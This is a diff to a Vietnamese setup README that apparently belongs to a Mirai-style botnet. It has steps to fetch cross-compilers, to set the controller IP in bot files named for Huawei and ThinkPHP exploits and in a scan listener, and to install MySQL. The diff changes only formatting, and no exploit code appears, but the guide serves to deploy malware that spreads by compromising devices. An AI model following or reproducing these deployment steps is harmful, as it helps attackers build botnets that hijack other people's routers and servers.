@@ -17,6 +17,7 @@ mkdir /etc/xcompile; cd /etc/xcompile; wget https://www.uclibc.org/downloads/bin
 ```
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 Thay đổi IP:
+
 ```/bot/huawei.c``` Tìm quên
 
 ```/bot/thinkphp.c``` Tìm quên
@@ -34,12 +35,13 @@ Thay đổi IP:
 ```/scanListen.go```
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 Cài đặt mysql tạo mật khẩu root
-Sao chép & Dán này: service 
+Sao chép & Dán này: 
 ```
-mysqld start; mysql_secure_installation
+service mysqld start; mysql_secure_installation
 ```
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 Đăng nhập vào mysql:
+
 Sao chép & Dán này:  
 ```
 mysql -u root -p
